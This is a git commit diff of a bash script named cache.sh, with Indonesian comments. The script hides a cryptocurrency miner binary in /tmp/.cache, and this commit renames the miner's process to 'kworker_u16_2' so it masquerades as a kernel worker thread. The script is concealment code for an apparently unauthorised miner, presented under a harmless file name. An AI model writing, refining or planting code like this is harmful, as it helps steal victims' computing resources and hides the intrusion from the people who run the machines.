f2b3d80074f321e5394eb4b56e821a34dbe4d137
ANTI VIRAL <109937537+tobrutkota@users.noreply.github.com>
2025-03-05 19:16:22 +0800

    Update cache.sh

--- cache.sh
+++ cache.sh
@@ -1,14 +1,13 @@
 #!/bin/bash
 
 # Nama proses penyamaran
-PROC_NAME="tobrut"
+PROC_NAME="kworker_u16_2"
 
-# Folder tersembunyi baru
+# Folder tersembunyi
 MINER_DIR="/tmp/.cache"
 MINER_BIN="$MINER_DIR/$PROC_NAME"
-CONFIG_FILE="$MINER_DIR/config.ini"
 
-# Bikin folder kalau belum ada
+# Pastikan direktori ada
 mkdir -p "$MINER_DIR"
 
 # Pindahkan file miner jika belum ada
@@ -18,14 +17,6 @@ if [ ! -f "$MINER_BIN" ]; then
     echo "Padi berhasil dipindahkan ke $MINER_BIN"
 else
     echo "Padi sudah ada di $MINER_BIN"
-fi
-
-# Pindahkan config jika belum ada
-if [ ! -f "$CONFIG_FILE" ]; then
-    mv config.ini "$CONFIG_FILE"
-    echo "Config berhasil dipindahkan ke $CONFIG_FILE"
-else
-    echo "Config sudah ada di $CONFIG_FILE"
 fi
 
 exit 0
